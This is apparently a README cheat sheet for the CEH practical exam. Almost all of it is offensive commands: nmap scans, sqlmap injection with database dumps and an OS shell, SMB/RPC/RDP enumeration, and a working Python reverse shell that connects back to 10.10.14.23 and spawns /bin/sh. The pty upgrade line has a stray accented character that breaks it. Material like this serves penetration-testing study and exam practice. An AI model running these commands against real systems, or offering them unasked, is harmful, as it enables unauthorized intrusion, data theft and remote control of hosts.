# CEH-Practical-Cheatsheet

This is a quick cheat sheet to refer to when practising for the CEH practical exam. The exam assesses your skills in attacking common services such as FTP, SMB and your enumeration skills. This is not a hard exam and is perfect for beginner pentesters.

## NMAP

- Scan a single IP	            	 `nmap 192.168.1.1`
- Scan a host	                    `nmap www.testhostname.com`
- Scan a range of IPs	            `nmap 192.168.1.1-20`
- Scan a subnet	                    `nmap 192.168.1.0/24`
- Scan targets from a text file	    `nmap -iL list-of-ips.txt`

- Scan a single Port	                `nmap -p 22 192.168.1.1`
- Scan a range of ports	            `nmap -p 1-100 192.168.1.1`
- Scan 100 most common ports (Fast)	`nmap -F 192.168.1.1`
- Scan all 65535 ports	            `nmap -p- 192.168.1.1`

- Scan using TCP connect	                `nmap -sT 192.168.1.1`
- Scan using TCP SYN scan (default)	    `nmap -sS 192.168.1.1`
- Scan UDP ports	                        `nmap -sU -p 123,161,162 192.168.1.1`
- Scan selected ports - ignore discovery	`nmap -Pn -F 192.168.1.1`

- Detect OS and Services	            `nmap -A 192.168.1.1`
- Standard service detection	        `nmap -sV 192.168.1.1`
- More aggressive Service Detection	    `nmap -sV --version-intensity 5 192.168.1.1`
- Lighter banner grabbing detection	    `nmap -sV --version-intensity 0 192.168.1.1`

- Save default output to file	        `nmap -oN outputfile.txt 192.168.1.1`
- Save results as XML	                `nmap -oX outputfile.xml 192.168.1.1`
- Save results in a format for grep	    `nmap -oG outputfile.txt 192.168.1.1`
- Save in all formats	                `nmap -oA outputfile 192.168.1.1`


- Scan using default safe scripts	    `nmap -sV -sC 192.168.1.1`
- Get help for a script	                `nmap --script-help=ssl-heartbleed`
- Scan using a specific NSE script	    `nmap -sV -p 443 –script=ssl-heartbleed.nse 192.168.1.1`
- Scan with a set of scripts	        `nmap -sV --script=smb* 192.168.1.1`

- Gather page titles from HTTP services	`nmap --script=http-title 192.168.1.0/24`
- Get HTTP headers of web services	    `nmap --script=http-headers 192.168.1.0/24`
- Find web apps from known paths	        `nmap --script=http-enum 192.168.1.0/24`


## SQLMAP

- Simple usage `sqlmap -u “https://target_site.com/page/”`
- Automatic GET request parameter `sqlmap -u “https://target_site.com/page?p1=value1&p2=value2”`
- Use POST request `sqlmap -u “https://target_site.com/page/” --data="p1=value1&p2=value2"`
- Request file as input(get it from Burpsuite) `sqlmap -r request.txt`
- Use authenticated session with cookie `sqlmap -u “https://target_site.com/page/” --data="p1=value1&p2=value2" --cookie="Session_Cookie_Value"`
- Use authenticated session with auth headers `sqlmap -u “https://target_site.com/page/” --data="p1=value1&p2=value2" --headers="Authorization: Basic YWxhZGRpbjpvcGVuc2VzYW1l"` 
- Basic authentication `sqlmap -u “https://target_site.com/page/” --data="p1=value1&p2=value2" --auth-type=basic --auth-cred=username:password`

# Post exploitation(use these if the SQLi vuln is positive)

- List databases `sqlmap -u “https://target_site.com/page?p1=value1” --dbs`
- List tables of TARGET_DB `sqlmap -u “https://target_site.com/page?p1=value1” -D TARGET_DB --tables`
- List columns of TARGET_TABLE in TARGET_DB `sqlmap -u “https://target_site.com/page?p1=value1” -D TARGET_DB -T TARGET_TABLE --columns`
- Dump specific data of columns `sqlmap -u “https://target_site.com/page?p1=value1” -D TARGET_DB -T TARGET_TABLE -C "Col1,Col2" --dump`
- Fully dump table `sqlmap -u “https://target_site.com/page?p1=value1” -D TARGET_DB -T TARGET_TABLE --dump`
- Dump the entire database `sqlmap -u “https://target_site.com/page?p1=value1” -D TARGET_DB --dump`
- Custom SQL query `sqlmap -u “https://target_site.com/page?p1=value1” --sql-query "SELECT * FROM TARGET_DB;"`
- Get OS shell `sqlmap -u “https://target_site.com/page?p1=value1” --os-shell`
- Get SQL shell `sqlmap -u “https://target_site.com/page?p1=value1” --sqlmap-shell`
- Use attack techniques `sqlmap -u “https://target_site.com/page?p1=value1” --technique=BEUSTQ`
    - B: Boolean-based blind
    - E: Error-based
    - U: Union query-based
    - S: Stacked queries
    - T: Time-based blind
    - Q: Inline queries

### General purpose command

`sqlmap -u “https://target_site.com/page/”--proxy="http://127.0.0.1:8080/" --cookie=”SESSID=lred0jr6na1vmci;” --data=”p1=value1” -p p1 --level=5 --risk=3 --dbms=mysql --technique=BEUSTQ --force-ssl`

## Telnet enumeration

`telnet 192.168.0.1`

## FTP enumeration

`ftp 192.168.0.1`

## SMB Enumeration

`smbmap -H 192.168.0.1 -R`
`smbclient -L 192.168.0.1`
`smbclient \\\\192.168.0.1\\share`

## RPC Enumeration

`rpcclient -U "" -N 192.168.0.1`
`enumdomusers`
`queryuser <username>`

## RDP Enumeration

`xfreerdp /v:10.129.189.90 /cert:ignore /u:Administrator` 

## Shells

`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.23\",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'`

https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

### after obtaining shell

`python -c 'ímport pty;pty.spawn("/bin/sh")'`
